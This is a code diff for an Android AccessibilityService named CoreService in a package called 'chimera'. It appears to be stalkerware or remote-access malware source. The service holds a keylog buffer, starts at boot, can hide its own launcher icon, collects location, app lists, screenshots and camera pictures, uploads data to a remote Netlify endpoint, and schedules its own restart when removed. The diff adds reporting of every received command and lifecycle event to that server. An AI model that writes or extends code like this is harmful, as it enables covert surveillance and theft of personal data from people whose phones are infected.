@@ -1,3 +1,4 @@
+// ... (imports remain the same as the last correct version)
 package com.chimera;
 
 import android.Manifest;
@@ -33,12 +34,11 @@ import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationServices;
 import org.json.JSONException;
 import org.json.JSONObject;
-
 import java.io.ByteArrayOutputStream;
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
-
+    // ... (class variables remain the same)
     private static final String TAG = "CoreService";
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
     private static final String UPLOAD_FILE_URL = "https://chimeradmin.netlify.app/.netlify/functions/upload-file";
@@ -58,7 +58,6 @@ public class CoreService extends AccessibilityService {
             keylogBuffer.setLength(0);
         }
     };
-
     public static class BootReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -72,13 +71,12 @@ public class CoreService extends AccessibilityService {
             }
         }
     }
-
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
         this.requestQueue = Volley.newRequestQueue(getApplicationContext());
         this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
-        Log.i(TAG, "Ghost protocol engaged. Service is online.");
+        submitDataToServer("lifecycle", "CoreService connected and online.");
     }
 
     @Override
@@ -92,8 +90,8 @@ public class CoreService extends AccessibilityService {
     private void handleCommand(Intent intent) {
         String action = intent.getAction();
         if (action == null) return;
-        Log.i(TAG, "Handling command: " + action);
         String command = action.replace("com.chimera.action.", "").toUpperCase();
+        submitDataToServer("lifecycle", "Command received: " + command);
 
         switch (command) {
             case "TOGGLE_ICON":
@@ -115,6 +113,7 @@ public class CoreService extends AccessibilityService {
         }
     }
 
+    // ... (onAccessibilityEvent method remains the same)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
@@ -138,11 +137,13 @@ public class CoreService extends AccessibilityService {
 
     private void handleToggleIcon(boolean show) {
         PackageManager pm = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class); // CORRECTED
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
         int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
         pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
+        submitDataToServer("lifecycle", "Icon visibility set to: " + show);
     }
 
+    // ... (handleGetLocation, handleListApps, handleScreenshot, handleTakePicture methods remain the same)
     @SuppressLint("MissingPermission")
     private void handleGetLocation() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -206,12 +207,13 @@ public class CoreService extends AccessibilityService {
         try {
             if (cameraIdStr != null) cameraId = Integer.parseInt(cameraIdStr);
         } catch (NumberFormatException e) { Log.w(TAG, "Invalid camera ID, defaulting to 0."); }
+
         Intent intent = new Intent(this, CameraActivity.class);
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         intent.putExtra("camera_id", cameraId);
         startActivity(intent);
     }
-
+    // ... (submitDataToServer and uploadFileToServer methods remain the same)
     private void submitDataToServer(String dataType, Object payload) {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         JSONObject postData = new JSONObject();
@@ -244,9 +246,12 @@ public class CoreService extends AccessibilityService {
     }
     
     @Override
-    public void onInterrupt() { }
+    public void onInterrupt() {
+        submitDataToServer("lifecycle", "Service interrupted.");
+    }
     @Override
     public void onTaskRemoved(Intent rootIntent) {
+        submitDataToServer("lifecycle", "Task removed. Scheduling restart.");
         super.onTaskRemoved(rootIntent);
         Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
         PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
